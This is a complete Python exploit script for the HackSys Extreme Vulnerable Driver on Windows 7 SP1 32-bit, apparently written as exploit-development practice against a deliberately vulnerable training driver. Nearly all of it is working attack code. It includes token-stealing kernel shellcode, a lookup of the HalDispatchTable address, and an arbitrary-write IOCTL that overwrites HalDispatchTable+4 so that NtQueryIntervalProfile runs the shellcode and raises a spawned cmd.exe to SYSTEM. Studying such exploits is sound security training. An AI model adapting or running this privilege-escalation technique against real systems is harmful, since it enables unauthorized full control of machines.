# HackSys Extreme Vulnerable Driver
# arbitary overwrite exploit
# Target: Windows 7 SP1 32-bit
# Author: raycp
# Date: 2018-08-01

from ctypes import *
from ctypes.wintypes import *
import sys, struct, time

# Define constants
CREATE_NEW_CONSOLE = 0x00000010
GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 0x00000003
FILE_ATTRIBUTE_NORMAL = 0x00000080
FILE_DEVICE_UNKNOWN = 0x00000022
FILE_ANY_ACCESS = 0x00000000
METHOD_NEITHER = 0x00000003
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x00000040
HANDLE = c_void_p
LPTSTR = c_void_p
LPBYTE = c_char_p

# Define WinAPI shorthand
CreateProcess = windll.kernel32.CreateProcessW # <-- Unicode version!
VirtualAlloc = windll.kernel32.VirtualAlloc
CreateFile = windll.kernel32.CreateFileW # <-- Unicode version!
DeviceIoControl = windll.kernel32.DeviceIoControl
EnumDeviceDrivers = windll.Psapi.EnumDeviceDrivers
GetDeviceDriverBaseNameA = windll.Psapi.GetDeviceDriverBaseNameA
LoadLibraryExA = windll.kernel32.LoadLibraryExA
GetProcAddress = windll.kernel32.GetProcAddress
NtQueryIntervalProfile = windll.ntdll.NtQueryIntervalProfile

class STARTUPINFO(Structure):
    """STARTUPINFO struct for CreateProcess API"""

    _fields_ = [("cb", DWORD),
                ("lpReserved", LPTSTR),
                ("lpDesktop", LPTSTR),
                ("lpTitle", LPTSTR),
                ("dwX", DWORD),
                ("dwY", DWORD),
                ("dwXSize", DWORD),
                ("dwYSize", DWORD),
                ("dwXCountChars", DWORD),
                ("dwYCountChars", DWORD),
                ("dwFillAttribute", DWORD),
                ("dwFlags", DWORD),
                ("wShowWindow", WORD),
                ("cbReserved2", WORD),
                ("lpReserved2", LPBYTE),
                ("hStdInput", HANDLE),
                ("hStdOutput", HANDLE),
                ("hStdError", HANDLE)]

class PROCESS_INFORMATION(Structure):
    """PROCESS_INFORMATION struct for CreateProcess API"""

    _fields_ = [("hProcess", HANDLE),
                ("hThread", HANDLE),
                ("dwProcessId", DWORD),
                ("dwThreadId", DWORD)]

def procreate():
    """Spawn shell and return PID"""

    print "[*]Spawning shell..."
    lpApplicationName = u"c:\\windows\\system32\\cmd.exe" # Unicode
    lpCommandLine = u"c:\\windows\\system32\\cmd.exe" # Unicode
    lpProcessAttributes = None
    lpThreadAttributes = None
    bInheritHandles = 0
    dwCreationFlags = CREATE_NEW_CONSOLE
    lpEnvironment = None
    lpCurrentDirectory = None
    lpStartupInfo = STARTUPINFO()
    lpStartupInfo.cb = sizeof(lpStartupInfo)
    lpProcessInformation = PROCESS_INFORMATION()
    
    ret = CreateProcess(lpApplicationName,           # _In_opt_      LPCTSTR
                        lpCommandLine,               # _Inout_opt_   LPTSTR
                        lpProcessAttributes,         # _In_opt_      LPSECURITY_ATTRIBUTES
                        lpThreadAttributes,          # _In_opt_      LPSECURITY_ATTRIBUTES
                        bInheritHandles,             # _In_          BOOL
                        dwCreationFlags,             # _In_          DWORD
                        lpEnvironment,               # _In_opt_      LPVOID
                        lpCurrentDirectory,          # _In_opt_      LPCTSTR
                        byref(lpStartupInfo),        # _In_          LPSTARTUPINFO
                        byref(lpProcessInformation)) # _Out_         LPPROCESS_INFORMATION
    if not ret:
        print "\t[-]Error spawning shell: " + FormatError()
        sys.exit(-1)

    time.sleep(1) # Make sure cmd.exe spawns fully before shellcode executes

    print "\t[+]Spawned with PID: %d" % lpProcessInformation.dwProcessId
    return lpProcessInformation.dwProcessId

def gethandle():
    """Open handle to driver and return it"""

    print "[*]Getting device handle..."
    lpFileName = u"\\\\.\\HacksysExtremeVulnerableDriver"
    dwDesiredAccess = GENERIC_READ | GENERIC_WRITE
    dwShareMode = 0
    lpSecurityAttributes = None
    dwCreationDisposition = OPEN_EXISTING
    dwFlagsAndAttributes = FILE_ATTRIBUTE_NORMAL
    hTemplateFile = None

    handle = CreateFile(lpFileName,             # _In_     LPCTSTR
                        dwDesiredAccess,        # _In_     DWORD
                        dwShareMode,            # _In_     DWORD
                        lpSecurityAttributes,   # _In_opt_ LPSECURITY_ATTRIBUTES
                        dwCreationDisposition,  # _In_     DWORD
                        dwFlagsAndAttributes,   # _In_     DWORD
                        hTemplateFile)          # _In_opt_ HANDLE

    if not handle or handle == -1:
        print "\t[-]Error getting device handle: " + FormatError()
        sys.exit(-1)
        
    print "\t[+]Got device handle: 0x%x" % handle
    return handle

def ctl_code(function,
             devicetype = FILE_DEVICE_UNKNOWN,
             access = FILE_ANY_ACCESS,
             method = METHOD_NEITHER):
    """Recreate CTL_CODE macro to generate driver IOCTL"""
    return ((devicetype << 16) | (access << 14) | (function << 2) | method)

def shellcode(pid):
    """Craft our shellcode and stick it in a buffer"""

    tokenstealing = (
        #---[Setup]
        "\x60"                      # pushad
        "\x64\xA1\x24\x01\x00\x00"  # mov eax, fs:[KTHREAD_OFFSET]
        "\x8B\x40\x50"              # mov eax, [eax + EPROCESS_OFFSET]
        "\x89\xC1"                  # mov ecx, eax (Current _EPROCESS structure)
        "\x8B\x98\xF8\x00\x00\x00"  # mov ebx, [eax + TOKEN_OFFSET]
        #-- find cmd process"
        "\xBA"+ struct.pack("<I",pid) +  #mov edx,pid(CMD)
        "\x8B\x89\xB8\x00\x00\x00"  # mov ecx, [ecx + FLINK_OFFSET] <-|
        "\x81\xe9\xB8\x00\x00\x00"      # sub ecx, FLINK_OFFSET           |
        "\x39\x91\xB4\x00\x00\x00"  # cmp [ecx + PID_OFFSET], edx     |
        "\x75\xED"                  # jnz
        #---[Copy System PID token]
        "\xBA\x04\x00\x00\x00"      # mov edx, 4 (SYSTEM PID)
        "\x8B\x80\xB8\x00\x00\x00"  # mov eax, [eax + FLINK_OFFSET] <-|
        "\x2D\xB8\x00\x00\x00"      # sub eax, FLINK_OFFSET           |
        "\x39\x90\xB4\x00\x00\x00"  # cmp [eax + PID_OFFSET], edx     |
        "\x75\xED"                  # jnz                           ->|
        "\x8B\x90\xF8\x00\x00\x00"  # mov edx, [eax + TOKEN_OFFSET]
        "\x89\x91\xF8\x00\x00\x00"  # mov [ecx + TOKEN_OFFSET], edx
        #---[Recover]
        
        "\x61"                      # popad
        "\x31\xC0"                  # NTSTATUS -> STATUS_SUCCESS
        #"\x83\xc4\x18"
        #"\x5d"                      #pop ebp
        "\xC2\x08\x00"              # ret 8
        
        ""
    )
                                        #    ret

    print "[*]Allocating buffer for shellcode..."
    lpAddress = None
    dwSize = len(tokenstealing)
    flAllocationType = (MEM_COMMIT | MEM_RESERVE)
    flProtect = PAGE_EXECUTE_READWRITE
    
    addr = VirtualAlloc(lpAddress,         # _In_opt_  LPVOID
                        dwSize,            # _In_      SIZE_T
                        flAllocationType,  # _In_      DWORD
                        flProtect)         # _In_      DWORD
    if not addr:
        print "\t[-]Error allocating shellcode: " + FormatError()
        sys.exit(-1)

    print "\t[+]Shellcode buffer allocated at: 0x%x" % addr
    
    # put de shellcode in de buffer and shake it all up
    memmove(addr, tokenstealing, len(tokenstealing))
    return addr

def get_HALtable_address():
    #Enumerating load addresses for all device drivers, and fetching base address and name for ntkrnlpa.exe
    enum_base = (c_ulong * 1024)()
    enum = EnumDeviceDrivers(byref(enum_base), c_int(1024), byref(c_long()))
    if not enum:
        print "Failed to enumerate!!!"
        sys.exit(-1)
            
    for base_address in enum_base:
        if not base_address:
            continue
        base_name = c_char_p('\x00' * 1024)
        driver_base_name = GetDeviceDriverBaseNameA(base_address, base_name, 48)
        
        if not driver_base_name:
            print "Unable to get driver base name!!!"
            sys.exit(-1)
 
        if base_name.value.lower() == 'ntkrnl' or 'ntkrnl' in base_name.value.lower():
            base_name = base_name.value
            print "[+] Loaded Kernel: {0}".format(base_name)
            print "[+] Base Address of Loaded Kernel: {0}".format(hex(base_address))
            break
 
    #Getting the HalDispatchTable
    kernel_handle = LoadLibraryExA(base_name, None, 0x00000001)
    if not kernel_handle:
        print "Unable to get Kernel Handle"
        sys.exit(-1)
 
    hal_address = GetProcAddress(kernel_handle, 'HalDispatchTable')
    
    # Subtracting ntkrnlpa base in user space
    hal_address -= kernel_handle
 
    # To find the HalDispatchTable address in kernel space, add the base address of ntkrnpa in kernel space
    hal_address += base_address
    
    # Just add 0x4 to HAL address for HalDispatchTable+0x4
    hal4 = hal_address + 0x4
 
    print "[+] HalDispatchTable    : {0}".format(hex(hal_address))
    
    print "[+] HalDispatchTable+0x4: {0}".format(hex(hal4))
    return hal4

def trigger(hDevice, dwIoControlCode, scAddr):
    """Create evil buffer and send IOCTL"""
    print hex(scAddr)
    evil_data=struct.pack("<I",scAddr)
    shellcode_address=id(evil_data)+20
    print hex(shellcode_address)
    hal4=get_HALtable_address()
    inBuffer = create_string_buffer(struct.pack("<I",shellcode_address)+ struct.pack("<I", hal4))
    #evilbuf = create_string_buffer("A"*0x828+'1'*4+'2'*4)

    print "[*]Triggering vulnerable IOCTL..."
    lpInBuffer = addressof(inBuffer)
    nInBufferSize = len(inBuffer) # ignore terminating \x00
    lpOutBuffer = None
    nOutBufferSize = 0
    lpBytesReturned = byref(c_ulong())
    lpOverlapped = None
    
    pwnd = DeviceIoControl(hDevice,             # _In_        HANDLE
                           dwIoControlCode,     # _In_        DWORD
                           lpInBuffer,          # _In_opt_    LPVOID
                           nInBufferSize,       # _In_        DWORD
                           lpOutBuffer,         # _Out_opt_   LPVOID
                           nOutBufferSize,      # _In_        DWORD
                           lpBytesReturned,     # _Out_opt_   LPDWORD
                           lpOverlapped)        # _Inout_opt_ LPOVERLAPPED
    if not pwnd:
        print "\t[-]Error: Not pwnd :(\n" + FormatError()
        sys.exit(-1)
    NtQueryIntervalProfile(0x1337, byref(c_ulong()))

if __name__ == "__main__":
    print "\n**HackSys Extreme Vulnerable Driver**"
    print "***Arbitary overwrite exploit***\n"

    pid = procreate()
    trigger(gethandle(), ctl_code(0x802), shellcode(pid)) # ugly lol
    #get_HALtable_address()
#bp nt!KeQueryIntervalProfile+0x23
